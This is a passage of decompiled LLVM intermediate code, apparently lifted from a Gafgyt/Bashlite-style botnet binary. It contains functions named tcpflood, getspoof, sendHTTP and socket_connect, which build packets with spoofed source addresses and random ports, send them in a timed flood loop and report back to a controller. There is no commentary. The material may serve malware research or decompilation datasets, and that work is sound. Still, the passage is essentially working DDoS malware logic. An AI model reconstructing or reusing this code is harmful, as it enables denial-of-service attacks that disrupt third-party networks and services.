  store i32 %v1_805065e, i32* %v3_8050b5a, align 4
  %v0_8050b5e = load i32, i32* %edx.global-to-local, align 4
  %v1_8050b5e = load i32, i32* @esp, align 4
  %v2_8050b5e = add i32 %v1_8050b5e, 4
  %v3_8050b5e = inttoptr i32 %v2_8050b5e to i32*
  store i32 %v0_8050b5e, i32* %v3_8050b5e, align 4
  store i32 %v3_80505e9, i32* %eax.global-to-local, align 4
  %v1_8050b65 = load i32, i32* @esp, align 4
  %v2_8050b65 = inttoptr i32 %v1_8050b65 to i32*
  store i32 %v3_80505e9, i32* %v2_8050b65, align 4
  %v1_8050b68 = load i32, i32* %stack_var_-96, align 4
  %v2_8050b68 = load i32, i32* %stack_var_-92, align 4
  %v3_8050b68 = load i32, i32* %stack_var_-88, align 4
  %v4_8050b68 = load i32, i32* %stack_var_-84, align 4
  %v6_8050b68 = call i32 @sendto(i32 %stack_var_-100.0, i32 %v1_8050b68, i32 %v2_8050b68, i32 %v3_8050b68, i32 %v4_8050b68, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8050b68, i32* %eax.global-to-local, align 4
  %v1_8050b6d = call i32 @getspoof(i32 %stack_var_-100.0)
  store i32 %v1_8050b6d, i32* %edx.global-to-local, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b6d, i32* %v3_8050b77, align 4
  %v1_8050b7a = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  %v1_8050b7f = urem i32 %v1_8050b7a, 65536
  store i32 %v1_8050b7f, i32* %edx.global-to-local, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v1_8050b85 = trunc i32 %v1_8050b7a to i16
  store i16 %v1_8050b85, i16* %v4_8050b85, align 4
  %v1_8050b89 = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  store i32 %v1_8050b89, i32* %edx.global-to-local, align 4
  store i32 %v1_805069a, i32* %eax.global-to-local, align 4
  store i32 %v1_8050b89, i32* %v3_80506ef, align 8
  %v1_8050b96 = call i32 @rand_cmwc(i32 %stack_var_-100.0)
  %v1_8050ba1 = trunc i32 %v1_8050b96 to i16
  store i16 %v1_8050ba1, i16* %v5_805069d, align 4
  store i16 0, i16* %v2_8050aa4, align 4
  store i32 %v1_805069a, i32* %eax.global-to-local, align 4
  store i32 %v2_8050682, i32* %edx.global-to-local, align 4
  %v1_8050bb3 = load i32, i32* @esp, align 4
  %v2_8050bb3 = add i32 %v1_8050bb3, 4
  %v3_8050bb3 = inttoptr i32 %v2_8050bb3 to i32*
  store i32 %v1_805069a, i32* %v3_8050bb3, align 4
  %v0_8050bb7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050bb7 = load i32, i32* @esp, align 4
  %v2_8050bb7 = inttoptr i32 %v1_8050bb7 to i32*
  store i32 %v0_8050bb7, i32* %v2_8050bb7, align 4
  %v1_8050bba = load i32, i32* %stack_var_-96, align 4
  %v2_8050bba = inttoptr i32 %stack_var_-100.0 to i16*
  %v3_8050bba = call i32 @csum(i16* %v2_8050bba, i32 %v1_8050bba)
  %v1_8050bbf = urem i32 %v3_8050bba, 65536
  store i32 %v1_8050bbf, i32* %edx.global-to-local, align 4
  %v1_8050bc5 = trunc i32 %v3_8050bba to i16
  store i16 %v1_8050bc5, i16* %v2_8050aa4, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v3_8050bcc = load i16, i16* %v2_8050b03, align 2
  %v4_8050bcc = zext i16 %v3_8050bcc to i32
  store i32 %v4_8050bcc, i32* %edx.global-to-local, align 4
  store i32 %v2_8050682, i32* %eax.global-to-local, align 4
  %v1_8050bd5 = load i32, i32* @esp, align 4
  %v2_8050bd5 = add i32 %v1_8050bd5, 4
  %v3_8050bd5 = inttoptr i32 %v2_8050bd5 to i32*
  store i32 %v4_8050bcc, i32* %v3_8050bd5, align 4
  %v0_8050bd9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bd9 = load i32, i32* @esp, align 4
  %v2_8050bd9 = inttoptr i32 %v1_8050bd9 to i32*
  store i32 %v0_8050bd9, i32* %v2_8050bd9, align 4
  %v1_8050bdc = load i32, i32* %stack_var_-96, align 4
  %v3_8050bdc = call i32 @csum(i16* %v2_8050bba, i32 %v1_8050bdc)
  %v1_8050be1 = urem i32 %v3_8050bdc, 65536
  store i32 %v1_8050be1, i32* %edx.global-to-local, align 4
  %v1_8050be7 = trunc i32 %v3_8050bdc to i16
  store i16 %v1_8050be7, i16* %v4_8050b1e, align 2
  store i32 %v3_8050552, i32* %eax.global-to-local, align 4
  %v10_8050bee = icmp ult i32 %stack_var_-100.0, %v3_8050552
  store i1 %v10_8050bee, i1* %cf.global-to-local, align 1
  %v15_8050bee = icmp eq i32 %stack_var_-100.0, %v3_8050552
  %v1_8050bf1 = icmp eq i1 %v15_8050bee, false
  br i1 %v1_8050bf1, label %dec_label_pc_8050c10, label %dec_label_pc_8050bf3

dec_label_pc_8050bf3:                             ; preds = %dec_label_pc_8050b3d
  %v0_8050bf3 = load i32, i32* @esp, align 4
  %v1_8050bf3 = inttoptr i32 %v0_8050bf3 to i32*
  store i32 0, i32* %v1_8050bf3, align 4
  %v1_8050bfa = inttoptr i32 %stack_var_-100.0 to i32*
  %v2_8050bfa = call i32 @__GI_time(i32* %v1_8050bfa)
  store i32 %v2_8050bfa, i32* %eax.global-to-local, align 4
  %v10_8050bff = icmp ult i32 %v2_8050bfa, %v5_8050b2e
  store i1 %v10_8050bff, i1* %cf.global-to-local, align 1
  %v8_8050c02 = icmp sgt i32 %v2_8050bfa, %v5_8050b2e
  br i1 %v8_8050c02, label %dec_label_pc_8050c18, label %dec_label_pc_8050b3d

dec_label_pc_8050c10:                             ; preds = %dec_label_pc_8050b3d
  %v4_8050c10 = add i32 %stack_var_-100.0, 1
  br label %dec_label_pc_8050b3d

dec_label_pc_8050c18:                             ; preds = %dec_label_pc_8050bf3, %dec_label_pc_80505fc, %dec_label_pc_80505b4, %dec_label_pc_8050596, %entry
  %v0_8050c22 = phi i32 [ %v5_8050628, %dec_label_pc_80505fc ], [ %v3_80505e9, %dec_label_pc_80505b4 ], [ %v3_80505a6, %dec_label_pc_8050596 ], [ %v1_805050f, %entry ], [ %v2_8050bfa, %dec_label_pc_8050bf3 ]
  %v2_8050c1e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050c1e, i32* @ebx, align 4
  store i32 %v0_8050502, i32* @esi, align 4
  store i32 %v0_8050501, i32* @edi, align 4
  ret i32 %v0_8050c22

; uselistorder directives
  uselistorder i32 %v3_8050bdc, { 1, 0 }
  uselistorder i32 %v3_8050bba, { 1, 0 }
  uselistorder i32 %v1_8050b7a, { 1, 0 }
  uselistorder i32 %stack_var_-100.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_8050b2e, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8050b29, { 1, 0 }
  uselistorder i32 %v4_8050b13, { 1, 0 }
  uselistorder i32 %v4_8050af1, { 1, 0 }
  uselistorder i32 %v4_8050add, { 2, 1, 0 }
  uselistorder i32 %v1_8050ac9, { 1, 0 }
  uselistorder i32 %stack_var_-228.0, { 1, 0 }
  uselistorder i8* %stack_var_-224.0, { 1, 0 }
  uselistorder i1 %v0_8050a57, { 1, 0 }
  uselistorder i32 %v7_8050a55, { 1, 0 }
  uselistorder i1 %v0_8050a03, { 1, 0 }
  uselistorder i32 %v7_8050a01, { 1, 0 }
  uselistorder i1 %v0_80509ac, { 1, 0 }
  uselistorder i32 %v7_80509aa, { 1, 0 }
  uselistorder i1 %v0_8050955, { 1, 0 }
  uselistorder i32 %v7_8050953, { 1, 0 }
  uselistorder i1 %v0_80508fe, { 1, 0 }
  uselistorder i32 %v7_80508fc, { 1, 0 }
  uselistorder i1 %v0_80508a7, { 1, 0 }
  uselistorder i32 %v7_80508a5, { 1, 0 }
  uselistorder i32 %v4_8050875, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-224.143, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-228.144, { 4, 3, 2, 1, 0 }
  uselistorder i8* %v3_8050a25, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_8050a6d, { 5, 11, 4, 10, 3, 9, 2, 8, 1, 7, 0, 6 }
  uselistorder i8* %v2_8050840, { 1, 2, 0, 3 }
  uselistorder i1 %v0_805082a, { 1, 0 }
  uselistorder i32 %v7_8050828, { 1, 0 }
  uselistorder i8* %v2_80507d2, { 2, 3, 1, 4, 0, 5 }
  uselistorder i1 %v0_80507bc, { 1, 0 }
  uselistorder i8* %v2_8050740, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 0, 11 }
  uselistorder i1 %v0_805072a, { 1, 0 }
  uselistorder i32 %v2_80506d7, { 1, 0 }
  uselistorder i32 %v1_805069a, { 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %v2_8050682, { 13, 12, 11, 10, 9, 8, 25, 24, 23, 7, 6, 22, 5, 4, 21, 20, 19, 18, 28, 27, 26, 17, 16, 15, 14, 2, 3, 1, 0 }
  uselistorder i32 %v1_805065e, { 1, 0, 2 }
  uselistorder i32 %v2_8050654, { 1, 0 }
  uselistorder i32 %v3_80505e9, { 0, 2, 1, 5, 4, 3, 6, 7 }
  uselistorder i32 %v1_8050584, { 1, 0 }
  uselistorder i32 %v3_805055b, { 1, 0, 2 }
  uselistorder i32 %v3_8050552, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_8050549, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8050540, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v3_805052e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8050526, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-92, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 1, 0, 4, 3 }
  uselistorder i32 %tmp104, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 13, 12, 11, 10 }
  uselistorder i8** %stack_var_-20, { 2, 0, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 27, 28, 29, 31, 38, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %eax.global-to-local, { 29, 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9, 11, 12, 13, 14, 15, 16, 17, 75, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 56, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 49, 52, 51, 53, 54, 55, 58, 57, 59, 61, 60, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 73 }
  uselistorder i1* %cf.global-to-local, { 1, 2, 3, 4, 23, 5, 6, 8, 7, 9, 11, 10, 12, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 0, 24, 25, 26, 30, 27, 28, 29, 31, 38, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @htonl, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @getspoof, { 4, 3, 2, 1, 0 }
  uselistorder i32 -21, { 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8050b3d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050ada, { 1, 0 }
  uselistorder label %dec_label_pc_8050a77, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8050875, { 1, 0 }
  uselistorder label %dec_label_pc_805065b, { 1, 0 }
  uselistorder label %bb116, { 1, 0 }
  uselistorder label %dec_label_pc_8050596, { 1, 0 }
}

define i32 @tcpflood(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050c26 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c26, i32* %stack_var_-8, align 4
  %v15_8050c27 = ptrtoint i32* %stack_var_-124 to i32
  store i32 %arg2, i32* %stack_var_-124, align 4
  %v1_8050c35 = call i32 @mfork(i32 %arg2)
  %v1_8050c3a = icmp eq i32 %v1_8050c35, 0
  %v1_8050c3c = icmp eq i1 %v1_8050c3a, false
  br i1 %v1_8050c3c, label %dec_label_pc_8050f3d, label %dec_label_pc_8050c42

dec_label_pc_8050c42:                             ; preds = %entry
  %v7_8050c46 = icmp sgt i32 %arg3, 6
  br i1 %v7_8050c46, label %dec_label_pc_8050c48, label %dec_label_pc_8050ca6

dec_label_pc_8050c48:                             ; preds = %dec_label_pc_8050c42
  %v1_8050c4b = add i32 %arg4, 12
  %v1_8050c4e = inttoptr i32 %v1_8050c4b to i32*
  %v2_8050c4e = load i32, i32* %v1_8050c4e, align 4
  store i32 %v2_8050c4e, i32* %stack_var_-124, align 4
  %v1_8050c53 = call i32 @atol(i32 %v2_8050c4e)
  %v10_8050c58 = icmp eq i32 %v1_8050c53, -1
  br i1 %v10_8050c58, label %dec_label_pc_8050ca6, label %dec_label_pc_8050c5d

dec_label_pc_8050c5d:                             ; preds = %dec_label_pc_8050c48
  %v1_8050c60 = add i32 %arg4, 8
  %v1_8050c63 = inttoptr i32 %v1_8050c60 to i32*
  %v2_8050c63 = load i32, i32* %v1_8050c63, align 4
  store i32 %v2_8050c63, i32* %stack_var_-124, align 4
  %v1_8050c68 = call i32 @atol(i32 %v2_8050c63)
  %v10_8050c6d = icmp eq i32 %v1_8050c68, -1
  br i1 %v10_8050c6d, label %dec_label_pc_8050ca6, label %dec_label_pc_8050c78

dec_label_pc_8050c78:                             ; preds = %dec_label_pc_8050c5d
  %v1_8050c7b = add i32 %arg4, 20
  %v1_8050c7e = inttoptr i32 %v1_8050c7b to i32*
  %v2_8050c7e = load i32, i32* %v1_8050c7e, align 4
  store i32 %v2_8050c7e, i32* %stack_var_-124, align 4
  %v1_8050c83 = call i32 @atol(i32 %v2_8050c7e)
  %v2_8050c88 = icmp slt i32 %v1_8050c83, 0
  br i1 %v2_8050c88, label %dec_label_pc_8050ca6, label %dec_label_pc_8050c8c

dec_label_pc_8050c8c:                             ; preds = %dec_label_pc_8050c78
  %v12_8050c8c = icmp eq i32 %arg3, 7
  %v1_8050c90 = icmp eq i1 %v12_8050c8c, false
  br i1 %v1_8050c90, label %dec_label_pc_8050d23, label %dec_label_pc_8050c92

dec_label_pc_8050c92:                             ; preds = %dec_label_pc_8050c8c
  %v1_8050c95 = add i32 %arg4, 24
  %v1_8050c98 = inttoptr i32 %v1_8050c95 to i32*
  %v2_8050c98 = load i32, i32* %v1_8050c98, align 4
  store i32 %v2_8050c98, i32* %stack_var_-124, align 4
  %v1_8050c9d = call i32 @atol(i32 %v2_8050c98)
  %tmp31 = icmp slt i32 %v1_8050c9d, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br i1 %tmp32, label %dec_label_pc_8050d23, label %dec_label_pc_8050ca6

dec_label_pc_8050ca6:                             ; preds = %dec_label_pc_8050c42, %dec_label_pc_8050c92, %dec_label_pc_8050c78, %dec_label_pc_8050c5d, %dec_label_pc_8050c48
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v3_8050cbb = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_806af88.242 to i32))
  br label %dec_label_pc_8050f3d

dec_label_pc_8050d23:                             ; preds = %dec_label_pc_8050c92, %dec_label_pc_8050c8c
  %v1_8050cc8 = add i32 %arg4, 4
  %v1_8050ccb = inttoptr i32 %v1_8050cc8 to i32*
  %v2_8050ccb = load i32, i32* %v1_8050ccb, align 4
  %v2_8050cd6 = load i32, i32* %v1_8050c63, align 4
  store i32 %v2_8050cd6, i32* %stack_var_-124, align 4
  %v1_8050cdb = call i32 @atol(i32 %v2_8050cd6)
  %v2_8050ce9 = load i32, i32* %v1_8050c4e, align 4
  store i32 %v2_8050ce9, i32* %stack_var_-124, align 4
  %v1_8050cee = call i32 @atol(i32 %v2_8050ce9)
  %v1_8050cf9 = add i32 %arg4, 16
  %v1_8050cfc = inttoptr i32 %v1_8050cf9 to i32*
  %v2_8050cfc = load i32, i32* %v1_8050cfc, align 4
  %v2_8050d0d = load i32, i32* %v1_8050c7e, align 4
  store i32 %v2_8050d0d, i32* %stack_var_-124, align 4
  %v1_8050d12 = call i32 @atol(i32 %v2_8050d0d)
  br i1 %v1_8050c90, label %dec_label_pc_8050d4b, label %dec_label_pc_8050d2f

dec_label_pc_8050d2f:                             ; preds = %dec_label_pc_8050d23
  %v1_8050d32 = add i32 %arg4, 24
  %v1_8050d35 = inttoptr i32 %v1_8050d32 to i32*
  %v2_8050d35 = load i32, i32* %v1_8050d35, align 4
  store i32 %v2_8050d35, i32* %stack_var_-124, align 4
  %v1_8050d3a = call i32 @atol(i32 %v2_8050d35)
  br label %dec_label_pc_8050d4b

dec_label_pc_8050d4b:                             ; preds = %dec_label_pc_8050d23, %dec_label_pc_8050d2f
  %storemerge2 = phi i32 [ %v1_8050d3a, %dec_label_pc_8050d2f ], [ 10, %dec_label_pc_8050d23 ]
  %v1_8050d54 = add i32 %arg4, 28
  %v1_8050d57 = inttoptr i32 %v1_8050d54 to i32*
  %v2_8050d57 = load i32, i32* %v1_8050d57, align 4
  store i32 %v2_8050d57, i32* %stack_var_-124, align 4
  %v1_8050d5c = call i32 @atol(i32 %v2_8050d57)
  %v2_8050d77 = load i32, i32* %v1_8050ccb, align 4
  store i32 %v2_8050d77, i32* %stack_var_-124, align 4
  %v1_8050d7c = call i32 @inet_addr(i32 %v2_8050d77)
  %v2_8050d95 = mul i32 %v1_8050d5c, 28
  %v1_8050d9a = add i32 %v2_8050d95, 30
  %v2_8050d9d = and i32 %v1_8050d9a, -16
  %v0_8050da3 = load i32, i32* @esp, align 4
  %v2_8050da3 = sub i32 %v0_8050da3, %v2_8050d9d
  %v1_8050daf = add i32 %v2_8050da3, 43
  %v2_8050db2 = urem i32 %v1_8050daf, 16
  %v2_8050db5 = sub i32 %v1_8050daf, %v2_8050db2
  store i32 %v2_8050ccb, i32* @eax, align 4
  %v1_8050dc4 = add i32 %v2_8050da3, 4
  %v2_8050dc4 = inttoptr i32 %v1_8050dc4 to i32*
  store i32 ptrtoint (i32* @global_var_806a7de.148 to i32), i32* %v2_8050dc4, align 4
  %v0_8050dcc = load i32, i32* @eax, align 4
  %v1_8050dcc = load i32, i32* @esp, align 4
  %v2_8050dcc = inttoptr i32 %v1_8050dcc to i32*
  store i32 %v0_8050dcc, i32* %v2_8050dcc, align 4
  %v2_8050dcf = call i32 @__GI_strtok(i32 %v2_8050db5, i32 %v15_8050c27)
  %v1_8050ee6 = add i32 %v1_8050d5c, -1
  %v8_8050eea35 = icmp sgt i32 %v1_8050ee6, 0
  br i1 %v8_8050eea35, label %dec_label_pc_8050de3, label %dec_label_pc_8050ef0

dec_label_pc_8050de3:                             ; preds = %dec_label_pc_8050d4b, %dec_label_pc_8050de3
  %storemerge36 = phi i32 [ %v4_8050ee0, %dec_label_pc_8050de3 ], [ 0, %dec_label_pc_8050d4b ]
  store i32 %storemerge36, i32* @ebx, align 4
  %v2_8050dfa = mul i32 %storemerge36, 28
  %v3_8050dfc = add i32 %v2_8050dfa, %v2_8050db5
  %v4_8050dfc = inttoptr i32 %v3_8050dfc to i32*
  store i32 %storemerge36, i32* %v4_8050dfc, align 4
  %v1_8050e17 = add i32 %v3_8050dfc, 4
  %v2_8050e1d = inttoptr i32 %v1_8050e17 to i32*
  store i32 %v1_8050cdb, i32* %v2_8050e1d, align 4
  %v1_8050e37 = add i32 %v3_8050dfc, 8
  %v2_8050e3d = inttoptr i32 %v1_8050e37 to i32*
  store i32 %v1_8050cee, i32* %v2_8050e3d, align 4
  %v1_8050e57 = add i32 %v3_8050dfc, 12
  %v2_8050e5d = inttoptr i32 %v1_8050e57 to i32*
  store i32 %v2_8050cfc, i32* %v2_8050e5d, align 4
  %v1_8050e77 = add i32 %v3_8050dfc, 16
  %v2_8050e7d = inttoptr i32 %v1_8050e77 to i32*
  store i32 %v1_8050d12, i32* %v2_8050e7d, align 4
  %v1_8050e97 = add i32 %v3_8050dfc, 20
  %v2_8050e9d = inttoptr i32 %v1_8050e97 to i32*
  store i32 %storemerge2, i32* %v2_8050e9d, align 4
  %v1_8050eb7 = add i32 %v3_8050dfc, 24
  %v2_8050ebd = inttoptr i32 %v1_8050eb7 to i32*
  store i32 32, i32* %v2_8050ebd, align 4
  store i32 %v2_8050db5, i32* @ecx, align 4
  %v1_8050ed8 = load i32, i32* @esp, align 4
  %v2_8050ed8 = inttoptr i32 %v1_8050ed8 to i32*
  store i32 %v3_8050dfc, i32* %v2_8050ed8, align 4
  %v0_8050edb = call i32 @SendTCP()
  %v4_8050ee0 = add nuw nsw i32 %storemerge36, 1
  %exitcond = icmp eq i32 %v1_8050ee6, %v4_8050ee0
  br i1 %exitcond, label %dec_label_pc_8050ef0, label %dec_label_pc_8050de3

dec_label_pc_8050ef0:                             ; preds = %dec_label_pc_8050de3, %dec_label_pc_8050d4b
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_8050d4b ], [ %v1_8050ee6, %dec_label_pc_8050de3 ]
  %v1_8050ef3 = load i32, i32* @esp, align 4
  %v2_8050ef3 = add i32 %v1_8050ef3, 24
  %v3_8050ef3 = inttoptr i32 %v2_8050ef3 to i32*
  store i32 %v1_8050d5c, i32* %v3_8050ef3, align 4
  %v1_8050efa = load i32, i32* @esp, align 4
  %v2_8050efa = add i32 %v1_8050efa, 20
  %v3_8050efa = inttoptr i32 %v2_8050efa to i32*
  store i32 %v2_8050cfc, i32* %v3_8050efa, align 4
  %v1_8050f01 = load i32, i32* @esp, align 4
  %v2_8050f01 = add i32 %v1_8050f01, 16
  %v3_8050f01 = inttoptr i32 %v2_8050f01 to i32*
  store i32 %v1_8050cdb, i32* %v3_8050f01, align 4
  %v1_8050f08 = load i32, i32* @esp, align 4
  %v2_8050f08 = add i32 %v1_8050f08, 12
  %v3_8050f08 = inttoptr i32 %v2_8050f08 to i32*
  store i32 %v2_8050dcf, i32* %v3_8050f08, align 4
  %v1_8050f0f = load i32, i32* @esp, align 4
  %v2_8050f0f = add i32 %v1_8050f0f, 8
  %v3_8050f0f = inttoptr i32 %v2_8050f0f to i32*
  store i32 %arg2, i32* %v3_8050f0f, align 4
  %v0_8050f13 = load i32, i32* @esp, align 4
  %v1_8050f13 = add i32 %v0_8050f13, 4
  %v2_8050f13 = inttoptr i32 %v1_8050f13 to i32*
  store i32 ptrtoint ([54 x i8]* @global_var_806afe4.243 to i32), i32* %v2_8050f13, align 4
  %v1_8050f1e = load i32, i32* @esp, align 4
  %v2_8050f1e = inttoptr i32 %v1_8050f1e to i32*
  store i32 %arg1, i32* %v2_8050f1e, align 4
  %v1_8050f21 = load i32, i32* %stack_var_-8, align 4
  %v2_8050f21 = call i32 @Send(i32 %storemerge.lcssa, i32 %v1_8050f21)
  %v1_8050f29 = load i32, i32* @esp, align 4
  %v2_8050f29 = inttoptr i32 %v1_8050f29 to i32*
  store i32 %v1_8050cee, i32* %v2_8050f29, align 4
  %v1_8050f2c = call i32 @sleep(i32 %storemerge.lcssa)
  %v0_8050f31 = load i32, i32* @esp, align 4
  %v1_8050f31 = inttoptr i32 %v0_8050f31 to i32*
  store i32 0, i32* %v1_8050f31, align 4
  %v1_8050f38 = call i32 @__GI_exit(i32 %storemerge.lcssa)
  br label %dec_label_pc_8050f3d

dec_label_pc_8050f3d:                             ; preds = %entry, %dec_label_pc_8050ca6, %dec_label_pc_8050ef0
  %v0_8050f44 = phi i32 [ %v1_8050c35, %entry ], [ %v3_8050cbb, %dec_label_pc_8050ca6 ], [ %v1_8050f38, %dec_label_pc_8050ef0 ]
  ret i32 %v0_8050f44

; uselistorder directives
  uselistorder i32 %storemerge.lcssa, { 2, 1, 0 }
  uselistorder i32 %v4_8050ee0, { 1, 0 }
  uselistorder i32 %storemerge36, { 2, 3, 0, 1 }
  uselistorder i32 %v2_8050db5, { 1, 0, 2 }
  uselistorder i32 %arg4, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050f3d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050de3, { 1, 0 }
  uselistorder label %dec_label_pc_8050d4b, { 1, 0 }
  uselistorder label %dec_label_pc_8050ca6, { 1, 2, 3, 4, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050f45 = load i32, i32* @ebp, align 4
  store i32 %v0_8050f45, i32* %stack_var_-4, align 4
  %v4_8050f45 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8050f45, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8050f5f = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_8050f67 = icmp eq i32 %v1_8050f5f, 0
  %v1_8050f6b = icmp eq i1 %v4_8050f67, false
  br i1 %v1_8050f6b, label %dec_label_pc_8050f79, label %dec_label_pc_805103e

dec_label_pc_8050f79:                             ; preds = %entry
  %v1_8050f7c = add i32 %v1_8050f5f, 12
  %v2_8050f7c = inttoptr i32 %v1_8050f7c to i32*
  %v3_8050f7c = load i32, i32* %v2_8050f7c, align 4
  %v1_8050f84 = add i32 %v1_8050f5f, 16
  %v2_8050f84 = inttoptr i32 %v1_8050f84 to i32*
  %v3_8050f84 = load i32, i32* %v2_8050f84, align 4
  %v1_8050f87 = inttoptr i32 %v3_8050f84 to i32*
  %v2_8050f87 = load i32, i32* %v1_8050f87, align 4
  %v15_8050f90 = ptrtoint i32* %stack_var_-24 to i32
  %v3_8050f9a = call i32 @bcopy(i32 %v2_8050f87, i32 %v15_8050f90, i32 %v3_8050f7c)
  %v2_8050fa6 = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8050fcf = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_8050fd7 = ptrtoint i32* %stack_var_-32 to i32
  %v5_8050ffc = call i32 @__GI_setsockopt(i32 %v3_8050fcf, i32 6, i32 1, i32 %v2_8050fd7, i32 4)
  %v13_8051001 = icmp eq i32 %v3_8050fcf, -1
  %v1_8051005 = icmp eq i1 %v13_8051001, false
  br i1 %v1_8051005, label %dec_label_pc_8051010, label %dec_label_pc_805103e

dec_label_pc_8051010:                             ; preds = %dec_label_pc_8050f79
  %v2_8050f8d = ptrtoint i32* %stack_var_-28 to i32
  %v3_8051025 = call i32 @connect(i32 %v3_8050fcf, i32 %v2_8050f8d, i32 16)
  %v10_805102a = icmp eq i32 %v3_8051025, -1
  %v1_805102d = icmp eq i1 %v10_805102a, false
  br i1 %v1_805102d, label %dec_label_pc_8051038, label %dec_label_pc_805103e

dec_label_pc_8051038:                             ; preds = %dec_label_pc_8051010
  br label %dec_label_pc_805103e

dec_label_pc_805103e:                             ; preds = %dec_label_pc_8051010, %dec_label_pc_8050f79, %entry, %dec_label_pc_8051038
  %stack_var_-44.0 = phi i32 [ %v3_8050fcf, %dec_label_pc_8051038 ], [ 0, %entry ], [ 0, %dec_label_pc_8050f79 ], [ 0, %dec_label_pc_8051010 ]
  %v2_8051041 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051041, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_8050fcf, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_805103e, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp34 = inttoptr i32 %arg4 to i8*
  %stack_var_-1068 = alloca i32, align 4
  %v2_8051069 = call i32 @__GI_time(i32* null)
  %v5_805106e = add i32 %v2_8051069, %arg5
  %v1_8051074 = call i32 @random()
  store i32 %v1_8051074, i32* @ecx, align 4
  %v2_805108f = udiv i32 %v1_8051074, 49
  %tmp = mul i32 %v2_805108f, -17
  %v2_80510b1 = add i32 %v1_8051074, %tmp
  store i32 %v2_80510b1, i32* @edi, align 4
  %v1_80510bf = mul i32 %v2_80510b1, 4
  %v2_80510bf = add i32 %v1_80510bf, 134678656
  %v3_80510bf = inttoptr i32 %v2_80510bf to i32*
